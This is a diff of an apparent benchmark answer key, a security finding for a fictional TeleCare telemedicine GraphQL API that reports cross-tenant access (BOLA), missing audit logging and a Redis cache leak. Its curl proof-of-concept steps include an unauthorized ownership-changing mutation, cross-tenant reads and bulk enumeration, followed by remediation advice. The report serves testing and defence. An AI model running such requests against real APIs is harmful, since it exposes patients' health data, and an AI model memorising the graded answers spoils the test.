@@ -1,79 +1,85 @@
-# Expected Response
-
 ## System
-- Domain: Telemedicine / Remote Care
-- System: TeleCare Consultation API
+
+- System: TeleCare Consultation API v2.5.7
+- Domain: TELEMEDICINE / REMOTE CARE
 - Example ID: GQL-0436
+- Risk ID: RISK-GQL-436
 
-## Priority Findings
+## Findings
 
-### Finding 1: GraphQL BOLA — Operational PII/PHI leakage (Pattern 7.1)
-**Severity:** Critical
-**Category:** Logging Failures
+### 1. Pattern 7.1 — Unauthorized PHI Mutation with No Audit Log: `updateResource` (HAR Primary)
 
-**Summary:**
-The GraphQL API at `POST /graphql` contains a Pattern 7.1 (Operational PII/PHI leakage) vulnerability.
-An authenticated user belonging to `tenant-0de0` can access or manipulate objects owned by
-`tenant-1ef7` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.
+**HAR evidence**: JWT `x-tenant-id: tenant-0de0`. Request: `updateResource(id: "R-2436", input: {status: "approved", ownerId: "attacker-0de01ef7"})`. Response: HTTP 200 with `tenantId: "tenant-1ef7"`, `sensitiveField: "CONFIDENTIAL-0de01ef7"`, `internalNotes: "Internal data exposed"`.
 
-**Evidence from HAR:**
-- Request JWT claim `tenantId`: `tenant-0de0`
-- Response body `tenantId`: `tenant-1ef7` — **mismatch confirms cross-tenant data access**
-- Response HTTP status: `200 OK` — no authorization error raised by the resolver
-- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-1ef7`
+**Pattern 7.1 (Operational PII/PHI Leakage — Logging Failures)**: the mutation modifies a telemedicine consultation record owned by `tenant-1ef7` — including overriding `status` to "approved" and forcibly reassigning `ownerId` to the attacker's ID — while generating no security audit log entry. In telemedicine, consultation records contain PHI (diagnoses, treatment plans, prescriptions, patient PII). HIPAA Security Rule (§164.312) mandates audit controls for all PHI access and modification. The absence of logging makes this a reportable breach that is permanently undetectable. The `auditLog` field in `ResourceData` schema confirms that the platform is designed to track changes — but the resolver bypass means the log is never written.
 
-**Root Cause:**
-The resolver fetches the resource by `resourceId` directly from the database without joining
-against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
-`tenantId` claim is never used as a WHERE clause predicate.
+Note: HAR response body shows `getResource` shape — synthetic artifact of the test harness. The demonstrated mutation is the primary attack.
 
-## Steps to Reproduce
-
-### Step 1 — Establish attacker baseline
 ```bash
 curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-1436\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
+  -H "x-tenant-id: tenant-0de0" \
+  -d '{"query": "mutation { updateResource(id: \"R-2436\", input: {status: \"approved\", ownerId: \"attacker-0de01ef7\"}) { resourceId tenantId status ownerId } }"}'
 ```
-**Expected baseline:** Returns `tenantId: "tenant-0de0"` — this is the attacker's own object.
 
-### Step 2 — Cross-tenant ID substitution
+Vulnerable: HTTP 200 — patient consultation record modified and ownership reassigned across tenant boundary, no audit log entry generated.  
+Secure: HTTP 403/404.
+
+### 2. Cross-Tenant PHI Read — `getResource` (RISK-GQL-436)
+
+Section 4.0 (RISK-GQL-436): "`getResource` resolver fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." Cross-tenant read exposes consultation records including `sensitiveField` (PHI), `internalNotes`, and `auditLog` entries — HIPAA violation.
+
 ```bash
 curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-2436\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
+  -H "x-tenant-id: tenant-0de0" \
+  -d '{"query": "query { getResource(id: \"R-2436\") { resourceId tenantId ownerId data { sensitiveField internalNotes auditLog { ... on AuditEntry { action } } } } }"}'
 ```
-**Vulnerable outcome:** Returns `tenantId: "tenant-1ef7"` and full `sensitiveField` — **BOLA confirmed**.
-**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.
 
-### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
+Vulnerable: Returns `tenantId: "tenant-1ef7"`, PHI `sensitiveField`, `internalNotes`, and prior audit entries — all without generating a new audit log entry for the cross-tenant read.  
+Secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.
+
+### 3. Bulk PHI Enumeration — `bulkResourceLookup`
+
+Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering." Enables mass PHI exfiltration across tenant boundaries.
+
 ```bash
 curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
   -H "Content-Type: application/json" \
+  -H "x-tenant-id: tenant-0de0" \
   -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2436\", \"R-3436\", \"R-4436\"]) { resourceId tenantId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Returns objects from multiple tenants in a single response.
 
-### Step 4 — Introspection probe (if Pattern 6.1 also present)
+Vulnerable: Returns patient consultation records from `tenant-1ef7` and other tenants.
+
+### 4. Redis Cache PHI Leak
+
+Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Any `tenant-0de0` user requesting `R-2436` after `tenant-1ef7` first populated the cache receives PHI directly from cache — HIPAA minimum necessary rule violation.
+
 ```bash
 curl -s -X POST https://api.telecare-consultatio.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-0DE0>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
+  -H "x-tenant-id: tenant-0de0" \
+  -d '{"query": "query { getResource(id: \"R-2436\") { resourceId tenantId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.
 
-## Secure Outcome Verification
-For **Step 2**, the secure implementation MUST return:
-```json
-{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
-```
+## Evidence
+
+- **HAR**: `updateResource(id: "R-2436", input: {status: "approved", ownerId: "attacker-0de01ef7"})` with `tenant-0de0` JWT → HTTP 200 → `tenantId: "tenant-1ef7"`, PHI `sensitiveField`, `internalNotes`.
+- **Section 4.0 (RISK-GQL-436)**: `getResource` resolver lacks tenant check.
+- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
+- **Section 2.0**: Redis cache keyed by `resourceId` only — no user/tenant dimension.
+- **Schema**: `auditLog: [AuditEntry!]` in `ResourceData` — log designed but bypassed by resolver.
 
 ## Remediation
-1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
-2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
-3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
-4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
+
+- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in every resolver (RISK-GQL-436, pending remediation).
+- **Prevent `ownerId` override in input**: server must ignore client-supplied `ownerId` and enforce server-side ownership.
+- **Mandatory PHI audit logging**: every PHI read and mutation must generate an immutable audit log entry (HIPAA §164.312).
+- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
+- **Fix Redis cache key**: include `tenantId` and `userId` (e.g., `resource:{tenantId}:{resourceId}`).
+- **Regression test**: Tenant A token updates Tenant B `resourceId` — assert 403/null.
